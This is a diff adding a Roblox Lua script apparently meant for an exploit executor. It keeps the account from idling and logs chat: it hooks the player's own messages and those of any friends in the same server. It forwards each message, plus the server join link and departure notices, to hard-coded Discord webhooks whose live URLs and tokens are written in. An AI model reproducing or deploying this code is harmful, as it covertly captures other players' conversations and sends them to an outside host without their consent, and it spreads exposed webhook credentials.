@@ -1,0 +1,139 @@
+wait(3)
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+   wait(1)
+   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+  local plr = game.Players.LocalPlayer
+  local username = plr.Name
+  local uid = plr.UserId
+  
+ function hooker(arg)
+local url = 
+   "https://discord.com/api/webhooks/989528355848208434/WpS1bZQKmQWZJoXg3DJ5iEdkW2SKo2yD9f1WryXT4jNJ6paJS87QSgcR4-Fp6pjyk9eB"
+local data = {
+   ["content"] = "Elliott says:",
+   ["embeds"] = {
+       {
+           ["title"] = ""..arg.."",
+           ["description"] = "account used: "..username.."",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+end
+
+function friendhooker(friendname, arg)
+local url = 
+   "https://discord.com/api/webhooks/989528355848208434/WpS1bZQKmQWZJoXg3DJ5iEdkW2SKo2yD9f1WryXT4jNJ6paJS87QSgcR4-Fp6pjyk9eB"
+local data = {
+   ["content"] = ""..friendname.." said:",
+   ["embeds"] = {
+       {
+           ["title"] = ""..arg.."",
+           ["description"] = "",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+end
+ 
+  plr.Chatted:Connect(function(msg)
+     hooker(msg)
+  end)
+ 
+ 
+ for i,v in pairs(game.Players:GetChildren()) do
+ if v:IsFriendsWith(uid) then v.Chatted:Connect(function(msg)
+		friendhooker(v.Name, msg)
+	end)
+end
+end
+     
+     
+local gameid = game.PlaceId 
+local serverid = game.JobId
+local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local nodash = GetName.Name:gsub("%s+","-")
+local url = 
+   "https://discord.com/api/webhooks/989528183525224488/nBGM4hemCgeIPLzFh71Gmd46EtnE2EOc70GskP42sLyU1tPJCS6qgVFkJwzJd20PfDwr"
+local data = {
+   ["content"] = "https://www.roblox.com/games/"..gameid.."/"..nodash.."",
+   ["embeds"] = {
+       {
+           ["title"] =  "**Joined server: "..serverid.."**",
+           ["description"] = "",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+game.Players.PlayerRemoving:connect(function(Player)
+    if Player.UserId == uid then 
+local url = 
+   "https://discord.com/api/webhooks/989528183525224488/nBGM4hemCgeIPLzFh71Gmd46EtnE2EOc70GskP42sLyU1tPJCS6qgVFkJwzJd20PfDwr"
+local data = {
+   ["content"] = "",
+   ["embeds"] = {
+       {
+           ["title"] =  "elliott left :(",
+           ["description"] = "",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+end
+end)
